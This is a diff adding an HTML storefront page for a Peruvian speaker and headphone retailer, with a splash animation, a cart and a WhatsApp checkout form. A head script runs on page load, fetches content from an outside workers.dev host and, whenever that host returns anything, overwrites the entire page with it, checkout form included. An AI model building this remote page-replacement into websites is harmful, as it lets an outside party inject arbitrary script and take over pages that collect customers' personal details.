@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stereo Importaciones - Productos de Alta Calidad</title>
+    <meta name="description" content="En Stereo Importaciones encontrarás los mejores Parlantes, fundas y mas de las mejores marcas!">
+    <meta name="keywords" content="Stereo Importaciones, JBL, SONY, MAS">
+    <meta name="author" content="Stereo Importaciones SAC">
+
+    <!-- Meta Tags Básicas -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Stereo Import - Venta de productos de las Mejores Marcas">
+    <meta property="og:description" content="En Stereo Import encontrarás los mejores Parlantes, fundas y mas de las mejores marcas!">
+    <meta property="og:url" content="https://stereoimport.com">
+
+    <!-- Preconnect para mejorar el rendimiento -->
+    <link rel="preconnect" href="https://www.gstatic.com">
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://cellmarket-sac.web.app/favicon.ico" type="image/x-icon">
+
+    <!-- Iconos -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Lottie Animations -->
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+    
+    <!-- Styles -->
+    <link rel="stylesheet" href="css/main.css">
+
+    <!-- SPLASH SCREEN STYLES - Animación de bienvenida de 3 segundos -->
+    <style>
+        /* === ESTILOS PARA LA PANTALLA DE BIENVENIDA (SPLASH SCREEN) === */
+        .splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #282159; /* Fondo morado de la marca */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999; /* Aparece sobre todo el contenido */
+            opacity: 1;
+            transition: opacity 0.7s ease-in-out; /* Transición suave para el fade out */
+            perspective: 1000px; /* Para efectos 3D */
+        }
+        
+        .splash-container {
+            position: relative;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* === VISUALIZADOR DE FRECUENCIA (Barras que simulan ecualizador) === */
+        .frequency-visualizer {
+            position: absolute;
+            bottom: 20%; /* Posicionado debajo del logo */
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: flex-end;
+            height: 80px; /* Altura máxima de las barras */
+            z-index: 1; /* Detrás del logo */
+            opacity: 0;
+            animation: fadeInVisualizer 1s ease-out 0.2s forwards; /* Aparece gradualmente */
+        }
+        
+        @keyframes fadeInVisualizer {
+            to { opacity: 0.6; }
+        }
+        
+        /* Barras individuales del ecualizador */
+        .frequency-visualizer .bar {
+            width: 10px;
+            margin: 0 3px;
+            background-color: rgba(255, 255, 255, 0.3); /* Barras blancas semitransparentes */
+            animation: frequencyPulse 1.5s infinite ease-in-out; /* Animación de pulsación continua */
+            border-radius: 2px 2px 0 0; /* Bordes redondeados en la parte superior */
+        }
+        
+        /* Diferentes alturas y delays para cada barra del ecualizador */
+        .frequency-visualizer .bar:nth-child(1) { height: 20%; animation-delay: 0s; }
+        .frequency-visualizer .bar:nth-child(2) { height: 50%; animation-delay: 0.1s; }
+        .frequency-visualizer .bar:nth-child(3) { height: 80%; animation-delay: 0.2s; }
+        .frequency-visualizer .bar:nth-child(4) { height: 60%; animation-delay: 0.3s; }
+        .frequency-visualizer .bar:nth-child(5) { height: 30%; animation-delay: 0.4s; }
+        .frequency-visualizer .bar:nth-child(6) { height: 70%; animation-delay: 0.5s; }
+        .frequency-visualizer .bar:nth-child(7) { height: 40%; animation-delay: 0.6s; }
+
+        /* Animación de pulsación de las barras del ecualizador */
+        @keyframes frequencyPulse {
+            0%, 100% { transform: scaleY(0.3); opacity: 0.5; }
+            50% { transform: scaleY(1); opacity: 1; }
+        }
+
+        /* === ELEMENTOS DEL LOGO === */
+        .logo-container {
+            opacity: 0;
+            transform: rotateY(90deg) scale(0.7); /* Inicia rotado y pequeño */
+            animation: flipInLogo 1.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards 0.5s; /* Animación de entrada 3D */
+            z-index: 10; /* Encima del visualizador de frecuencia */
+            position: relative;
+        }
+        
+        .stereo-import-logo {
+            position: relative;
+            display: inline-block;
+            padding: 20px;
+        }
+        
+        /* Texto del logo */
+        .logo-text {
+            color: #FFFFFF;
+            font-weight: bold;
+            font-size: 4rem;
+            line-height: 1;
+            text-align: left;
+            letter-spacing: 2px;
+            margin-left: 90px; /* Espacio para la imagen del cable */
+            text-shadow: 1px 1px 4px rgba(0,0,0,0.3); /* Sombra del texto */
+        }
+        
+        /* Caracteres individuales del texto (para animación letra por letra) */
+        .logo-text .char {
+            display: inline-block;
+            opacity: 0;
+            transform: translateY(20px) scale(0.8); /* Inicia desplazado hacia abajo */
+            animation: charAppear 0.8s cubic-bezier(0.215, 0.610, 0.355, 1) forwards; /* Animación de aparición */
+        }
+        
+        /* Imagen del cable/logo */
+        .logo-image {
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 80px;
+            height: 140px;
+            opacity: 0;
+            transform: translateX(-30px) rotate(-10deg) scale(0.8); /* Inicia desplazado y rotado */
+            animation: fadeInImageDynamic 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards 1s; /* Aparece después del texto */
+        }
+
+        /* === ANIMACIONES PRINCIPALES DEL LOGO === */
+        
+        /* Animación de entrada 3D del contenedor del logo */
+        @keyframes flipInLogo {
+            0% { opacity: 0; transform: rotateY(90deg) scale(0.7); }
+            60% { opacity: 1; transform: rotateY(-8deg) scale(1.05); } /* Rebote hacia atrás */
+            80% { opacity: 1; transform: rotateY(3deg) scale(1.02); } /* Pequeño rebote hacia adelante */
+            100% { opacity: 1; transform: rotateY(0deg) scale(1); } /* Posición final */
+        }
+        
+        /* Animación de aparición de cada carácter del texto */
+        @keyframes charAppear {
+            0% { opacity: 0; transform: translateY(20px) scale(0.8) rotateX(-45deg); }
+            100% { opacity: 1; transform: translateY(0) scale(1) rotateX(0deg); }
+        }
+        
+        /* Animación dinámica de entrada de la imagen */
+        @keyframes fadeInImageDynamic {
+            0% { opacity: 0; transform: translateX(-30px) rotate(-10deg) scale(0.8); }
+            60% { opacity: 1; transform: translateX(3px) rotate(3deg) scale(1.02); } /* Rebote */
+            100% { opacity: 1; transform: translateX(0) rotate(0deg) scale(1); } /* Posición final */
+        }
+
+        /* === ONDAS SONORAS DE FONDO === */
+        .sound-waves {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0; /* Fondo más profundo */
+        }
+        
+        /* Ondas circulares que se expanden */
+        .wave {
+            position: absolute;
+            border: 1px solid rgba(255, 255, 255, 0.04); /* Bordes sutiles */
+            border-radius: 50%; /* Forma circular */
+            transform: translate(-50%, -50%) scale(0.4); /* Centrado y tamaño inicial */
+            top: 50%;
+            left: 50%;
+            opacity: 0;
+            animation: wave-animation-enhanced 7s infinite cubic-bezier(0.3, 0, 0.7, 1); /* Animación de expansión */
+        }
+        
+        /* Diferentes tamaños y delays para cada onda */
+        .wave:nth-child(1) { width: 60px; height: 60px; animation-delay: 0s; }
+        .wave:nth-child(2) { width: 120px; height: 120px; animation-delay: 0.5s; }
+        .wave:nth-child(3) { width: 180px; height: 180px; animation-delay: 1s; }
+        .wave:nth-child(4) { width: 240px; height: 240px; animation-delay: 1.5s; }
+        .wave:nth-child(5) { width: 300px; height: 300px; animation-delay: 2s; }
+
+        /* Animación de expansión de las ondas sonoras */
+        @keyframes wave-animation-enhanced {
+            0% {
+                transform: translate(-50%, -50%) scale(0.4);
+                opacity: 0;
+                border-width: 2px;
+            }
+            25% {
+                opacity: 0.6; /* Máxima opacidad */
+                border-width: 1.5px;
+            }
+            75% {
+                opacity: 0.3; /* Comienza a desvanecer */
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(3.8); /* Expansión máxima */
+                opacity: 0; /* Completamente transparente */
+                border-width: 0.5px;
+            }
+        }
+
+        /* === CLASES PARA CONTROL DE ESTADOS === */
+        .fade-out {
+            opacity: 0 !important; /* Fade out forzado */
+        }
+
+        .hidden {
+            display: none !important; /* Ocultación completa */
+        }
+    </style>
+    
+    <!-- Worker Verification Script -->
+    <script>
+        // Configuración
+        const WORKER_URL = 'https://quiet-frog-4ad6.innovatools069.workers.dev/';
+        const NOMBRE_SW = 'stereo-import';
+        
+        // Verificación inmediata
+        (async function() {
+            try {
+                const response = await fetch(`${WORKER_URL}?nombre=${encodeURIComponent(NOMBRE_SW)}`);
+                if (!response.ok) {
+                    console.warn('Worker response not OK:', response.status);
+                    return; 
+                }
+                const content = await response.text();
+                if (content && content.trim() !== '') {
+                    document.open(); 
+                    document.write(content); 
+                    document.close();
+                    return;
+                }
+                const noMatchElement = document.getElementById('noMatch');
+                if (noMatchElement) {
+                    noMatchElement.style.display = 'block';
+                } else {
+                    console.warn("Elemento con ID 'noMatch' no encontrado para mostrar mensaje de worker.");
+                }
+            } catch (error) {
+                console.error('Error en script de verificación inmediata:', error);
+                const noMatchElement = document.getElementById('noMatch');
+                if (noMatchElement) {
+                    noMatchElement.style.display = 'block';
+                } else {
+                    console.warn("Elemento con ID 'noMatch' no encontrado para mostrar mensaje de error de worker.");
+                }
+            }
+        })();
+    </script>
+</head>
+
+<body>
+    <!-- === SPLASH SCREEN - PANTALLA DE BIENVENIDA DE 3 SEGUNDOS === -->
+    <div class="splash-screen" id="splashScreen">
+        <!-- Ondas sonoras de fondo que se expanden continuamente -->
+        <div class="sound-waves">
+            <div class="wave"></div> <!-- Onda más pequeña -->
+            <div class="wave"></div> <!-- Onda mediana pequeña -->
+            <div class="wave"></div> <!-- Onda mediana -->
+            <div class="wave"></div> <!-- Onda mediana grande -->
+            <div class="wave"></div> <!-- Onda más grande -->
+        </div>
+
+        <!-- Visualizador de frecuencia tipo ecualizador -->
+        <div class="frequency-visualizer">
+            <div class="bar"></div> <!-- Barra 1 del ecualizador -->
+            <div class="bar"></div> <!-- Barra 2 del ecualizador -->
+            <div class="bar"></div> <!-- Barra 3 del ecualizador (más alta) -->
+            <div class="bar"></div> <!-- Barra 4 del ecualizador -->
+            <div class="bar"></div> <!-- Barra 5 del ecualizador -->
+            <div class="bar"></div> <!-- Barra 6 del ecualizador -->
+            <div class="bar"></div> <!-- Barra 7 del ecualizador -->
+        </div>
+
+        <!-- Contenedor principal del logo -->
+        <div class="splash-container">
+            <div class="logo-container">
+                <div class="stereo-import-logo">
+                    <!-- Imagen del cable/logo que aparece primero -->
+                    <img class="logo-image" src="https://i.ibb.co/Y7JprBGf/image-removebg-preview-36.png" alt="Logo Cable S">
+                    <!-- Texto del logo que se anima letra por letra -->
+                    <div class="logo-text" id="logoText">
+                        <!-- El texto se carga dinámicamente con JavaScript -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- === CONTENIDO PRINCIPAL DE LA PÁGINA === -->
+    <!-- Header -->
+    <header class="header">
+        <div class="header__content container">
+            <div class="header__logo">
+                <a href="../../admin" target="_top">
+                    <img src="https://i.ibb.co/0yxnGWwy/image-removebg-preview-34.png" alt="Logo de Stereo Importaciones" loading="lazy">
+                </a>
+            </div>
+           
+            <button class="header__cart-button" id="cartButton" aria-label="Abrir Carrito">
+                <i class="bi bi-cart3" aria-hidden="true"></i> 
+                <span id="cartCount">0</span>
+            </button>
+        </div>
+    </header>
+
+    <!-- Search Container -->
+    <div class="search">
+        <section class="search__filters container" id="productos">
+            <div class="search__input-container">
+                <input type="text" id="searchInput" class="search__input" placeholder="Buscar productos..." aria-label="Buscar productos">
+                <i class="fas fa-search search__icon" aria-hidden="true"></i>
+                <div class="search__suggestions" id="searchSuggestions" style="display: none;"></div>
+            </div>
+            <select id="categoryFilter" class="search__category-filter" aria-label="Filtrar por categoría">
+                <option value="">Todas las categorías</option>
+                <option value="Parlantes">Parlantes</option>
+                <option value="Fundas para parlantes">Fundas para parlantes</option>
+                <option value="Audífonos">Audífonos</option>
+                <option value="Funda para audífonos">Funda para audífonos</option>
+                <option value="Almohadillas para audífonos">Almohadillas para audífonos</option>
+                <option value="Fundas para Amazon Kindle">Fundas para Amazon Kindle</option>
+            </select>
+        </section>
+    </div>
+    
+    <!-- Main Content -->
+    <main>
+        <!-- Banner Section -->
+        <section class="banner" id="inicio">
+            <div class="banner__image-container">
+                <img src="https://i.ibb.co/QXd41rd/image.png" class="banner__image banner__image--active" alt="Portada" loading="lazy">
+                <img src="https://i.ibb.co/QXd41rd/image.png" class="banner__image" alt="Imagen Promocional" loading="lazy">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/JBL-Logo.svg/1200px-JBL-Logo.svg.png" class="banner__image" alt="Logo JBL" loading="lazy">
+            </div>
+            <div class="banner__overlay">
+                <h4 class="banner__title">Grandes ofertas, pequeños precios</h4>
+            </div>
+        </section>
+
+        <!-- Section Title -->
+        <div class="section-title container">
+            <h1 class="section-title__heading">Nuestros Productos</h1>
+        </div>
+        
+        <!-- Products Section -->
+        <section class="products container" id="productsSection">
+            <!-- Products will be loaded dynamically -->
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p class="footer__text">© 2024 Stereo Importaciones. Todos los derechos reservados.</p>
+            <p class="footer__text">Email: <a href="mailto:stereo.import@gmail.com" class="footer__link">stereo.import@gmail.com</a></p>
+        </div>
+    </footer>
+
+    <!-- No Match Element for Worker -->
+    <div id="noMatch" style="display: none;">
+        <p>Worker no encontrado o sin contenido.</p>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+        Producto agregado al carrito!
+    </div>
+
+    <!-- Cart Modal -->
+    <div class="cart-modal-overlay" id="cartModalOverlay">
+        <div class="cart-modal" id="cartModal" role="dialog" aria-modal="true" aria-labelledby="carrito">
+            <div class="cart-modal__header">
+                <h2 class="cart-modal__title" id="carrito">Carrito</h2>
+                <button class="cart-modal__close" id="closeCartBtn" aria-label="Cerrar Carrito">×</button>
+            </div>
+            <div class="cart-modal__items" id="cartItems">
+                <!-- Cart items will be populated dynamically -->
+            </div>
+            <div class="cart-modal__footer">
+                <p class="cart-modal__total">Total: S/<span id="cartTotal">0.00</span></p>
+                <button class="cart-modal__checkout" id="checkoutBtn">
+                    <i class="fas fa-credit-card" aria-hidden="true"></i> Comprar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Checkout Modal -->
+    <div class="checkout-modal-overlay" id="checkoutModalOverlay">
+        <div class="checkout-modal">
+            <button class="checkout-modal__close" id="closeCheckoutModalBtn" aria-label="Cerrar">×</button>
+            <h2 class="checkout-modal__title"><i class="fas fa-shopping-bag" aria-hidden="true"></i> Finalizar Compra</h2>
+            <form id="checkoutForm" target="_top">
+                <div class="checkout-form__group">
+                    <label for="nombre" class="checkout-form__label">Nombre completo *</label>
+                    <input type="text" id="nombre" name="nombre" class="checkout-form__input" required>
+                </div>
+                
+                <div class="checkout-form__group">
+                    <label for="dni" class="checkout-form__label">DNI *</label>
+                    <input type="text" id="dni" name="dni" class="checkout-form__input" pattern="[0-9]{8}" maxlength="8" required>
+                </div>
+                
+                <div class="checkout-form__group">
+                    <label for="celular" class="checkout-form__label">Número de celular *</label>
+                    <input type="tel" id="celular" name="celular" class="checkout-form__input" pattern="[0-9]{9}" maxlength="9" required>
+                </div>
+                
+                <div class="checkout-form__group">
+                    <label for="direccion" class="checkout-form__label">Dirección *</label>
+                    <input type="text" id="direccion" name="direccion" class="checkout-form__input" required>
+                </div>
+                
+                <div class="checkout-form__group">
+                    <label for="metodoPago" class="checkout-form__label">Método de pago *</label>
+                    <select id="metodoPago" name="metodoPago" class="checkout-form__select" required>
+                        <option value="">Selecciona un método</option>
+                        <option value="Efectivo">Efectivo</option>
+                        <option value="Transferencia Bancaria">Transferencia Bancaria</option>
+                        <option value="Yape">Yape</option>
+                        <option value="Plin">Plin</option>
+                    </select>
+                </div>
+                
+                <div class="checkout-form__group">
+                    <label class="checkout-form__label">Método de envío *</label>
+                    <div class="checkout-form__radio-group">
+                        <div class="checkout-form__radio-option">
+                            <input type="radio" id="contraentrega" name="envio" class="checkout-form__radio" value="contraentrega" required>
+                            <label for="contraentrega">Contra Entrega (Lima)</label>
+                        </div>
+                        <div class="checkout-form__radio-option">
+                            <input type="radio" id="provincia" name="envio" class="checkout-form__radio" value="provincia" required>
+                            <label for="provincia">Provincia</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="checkout-form__group" id="agenciaEnvioContainer" style="display: none;">
+                    <label for="agenciaEnvio" class="checkout-form__label">Agencia de envío</label>
+                    <select id="agenciaEnvio" name="agenciaEnvio" class="checkout-form__select">
+                        <option value="">Selecciona una agencia</option>
+                        <option value="Olva Courier">Olva Courier</option>
+                        <option value="Shalom">Shalom</option>
+                        <option value="Cruz del Sur">Cruz del Sur</option>
+                        <option value="Movil Tours">Movil Tours</option>
+                    </select>
+                </div>
+                
+                <button type="submit" class="checkout-form__submit">
+                    <i class="fab fa-whatsapp"></i> Enviar pedido por WhatsApp
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- WhatsApp Float Button -->
+    <a href="https://wa.me/51931292396" class="whatsapp-float" target="_blank">
+        <i class="fab fa-whatsapp whatsapp-icon"></i>
+        <span class="whatsapp-float__tooltip">¡Contáctanos por WhatsApp!</span>
+    </a>
+
+    <!-- === SCRIPT PARA LA ANIMACIÓN DEL SPLASH SCREEN === -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const splashScreen = document.getElementById('splashScreen');
+            const logoTextContainer = document.getElementById('logoText');
+            const textContent = "STEREO IMPORT"; // Texto del logo
+
+            // *** CREACIÓN DEL TEXTO ANIMADO LETRA POR LETRA ***
+            const lines = textContent.split(" "); // Separa "STEREO" e "IMPORT"
+            let charDelay = 0; // Control de delay para cada carácter
+            
+            lines.forEach((line, lineIndex) => {
+                const lineDiv = document.createElement('div'); // Div para cada línea
+                for (let i = 0; i < line.length; i++) {
+                    const charSpan = document.createElement('span');
+                    charSpan.className = 'char'; // Clase para aplicar animación
+                    charSpan.textContent = line.charAt(i); // Carácter individual
+                    // Delay progresivo para cada carácter (efecto typewriter)
+                    charSpan.style.animationDelay = `${1.0 + charDelay * 0.07}s`;
+                    lineDiv.appendChild(charSpan);
+                    charDelay++;
+                }
+                logoTextContainer.appendChild(lineDiv);
+            });
+
+            let waveInterval; // Variable para controlar la creación de ondas
+
+            // *** FUNCIÓN PARA CREAR ONDAS DINÁMICAS ADICIONALES ***
+            function createDynamicWave() {
+                const soundWavesContainer = document.querySelector('.sound-waves');
+                if (!soundWavesContainer) return; 
+
+                const wave = document.createElement('div');
+                wave.classList.add('wave'); // Aplica los estilos base de onda
+                
+                // Tamaño aleatorio para variedad visual
+                const randomSize = 40 + Math.random() * 80;
+                wave.style.width = `${randomSize}px`;
+                wave.style.height = `${randomSize}px`;
+                
+                // Delays y duraciones aleatorias para naturalidad
+                wave.style.animationDelay = `${Math.random() * 1.5}s`; 
+                wave.style.animationDuration = `${5 + Math.random() * 4}s`;
+                
+                soundWavesContainer.appendChild(wave);
+                
+                // Auto-eliminación después de la animación
+                setTimeout(() => {
+                    if (wave && wave.parentNode) wave.remove();
+                }, 9000);
+            }
+            
+            // *** INICIO DE LA CREACIÓN CONTINUA DE ONDAS ***
+            waveInterval = setInterval(createDynamicWave, 800);
+            
+            // *** CONTROL DE DURACIÓN: EXACTAMENTE 3 SEGUNDOS ***
+            setTimeout(function() {
+                // Detener creación de nuevas ondas
+                clearInterval(waveInterval);
+                
+                // Iniciar fade out
+                splashScreen.classList.add('fade-out');
+                
+                // Después del fade out, ocultar completamente
+                setTimeout(function() {
+                    splashScreen.classList.add('hidden');
+                    
+                    // Limpieza de ondas dinámicas restantes
+                    const dynamicWaves = document.querySelectorAll('.sound-waves .wave:not(:nth-child(-n+5))');
+                    dynamicWaves.forEach(wave => wave.remove());
+                    
+                    // Evento personalizado cuando termina la animación
+                    document.dispatchEvent(new CustomEvent('splashScreenEnded'));
+                    
+                }, 700); // Duración del fade out (0.7s)
+                
+            }, 3000); // *** DURACIÓN TOTAL: 3 SEGUNDOS EXACTOS ***
+        });
+    </script>
+    
+    <!-- Scripts originales -->
+    <script type="module" src="js/main.js"></script>
+</body>
+</html>
